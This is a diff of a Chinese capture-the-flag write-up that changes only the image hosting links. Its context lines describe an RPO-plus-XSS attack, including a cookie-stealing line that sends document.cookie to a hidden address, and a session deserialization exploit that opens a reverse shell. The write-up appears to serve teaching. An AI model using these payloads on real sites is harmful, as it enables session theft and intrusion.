@@ -143,17 +143,17 @@ hint2 : xss的点不在report页面
 
 <p>访问<code>http://39.107.33.96:20000/index.php/view/article/1226</code>的时候加载<code>jquery.min.js</code>的路径可以看到是正常的，</p>
 
-<p><img src="https://ob5vt1k7f.qnssl.com/oHZtz" alt="jquery.js" />
+<p><img src="https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/oHZtz" alt="jquery.js" />
 当访问<code>http://39.107.33.96:20000/index.php/view/article/1226/..%2f..%2f..%2f..%2findex.php</code>的时候浏览器尝试加载<code>..%2f..%2f..%2f..%2findex.php/static/js/jquery.min.js</code>这个数据，而服务端则往上读取三层路径，加载的是article的页面，如果article页面存在xss的话就会被加载，题目也正好满足要求，所以我们创建一篇文章写入获取cookie的js,利用这个url让服务器请求这篇文章，弹给我们cookie</p>
 
-<p><img src="https://ob5vt1k7f.qnssl.com/pa5qf" alt="jquery.js" /></p>
+<p><img src="https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/pa5qf" alt="jquery.js" /></p>
 
 <p>因为页面对一些特殊符号做了编码过滤，所以我们使用<code>String.fromCharCode()</code>方法从ascii码来加载js</p>
 
 <pre><code>window.location.href=String.fromCharCode(some ascii code) + document.cookie;
 </code></pre>
 
-<p><img src="https://ob5vt1k7f.qnssl.com/SVQMd" alt="md5" />
+<p><img src="https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/SVQMd" alt="md5" />
 这里有两个点的绕过：</p>
 
 <ul>
@@ -169,7 +169,7 @@ hint2 : xss的点不在report页面
 
 <p>nc监听端口，xssbot会先访问<code>/QWB_fl4g/QWB/index.php</code>，带上cookie后再访问article，触发xss，我们就能收到cookie</p>
 
-<p><img src="https://ob5vt1k7f.qnssl.com/yDw2L" alt="flag" /></p>
+<p><img src="https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/yDw2L" alt="flag" /></p>
 
 <h3 id="python-is-the-best-language-2">python is the best language #2</h3>
 
@@ -285,7 +285,7 @@ with open('test', 'rb') as f:
 
 <p>再搜索调用<code>get()</code>方法的地方</p>
 
-<p><img src="https://ob5vt1k7f.qnssl.com/S2Qaa" alt="get()" /></p>
+<p><img src="https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/S2Qaa" alt="get()" /></p>
 
 <pre><code class="language-python">def open_session(self, app, request):
     sid = request.cookies.get(app.session_cookie_name)
@@ -346,7 +346,7 @@ print '0x' + shellcode .encode('hex')
 
 <p>然后访问index，修改cookie的session值为<code>testabcd</code>，触发反序列化漏洞后反弹shell</p>
 
-<p><img src="https://ob5vt1k7f.qnssl.com/mYzKP" alt="reverse_shell" /></p>
+<p><img src="https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/mYzKP" alt="reverse_shell" /></p>
 
 <p>总结：
 - RPO可以结合XSS进行攻击，开发时不注意的话容易被利用
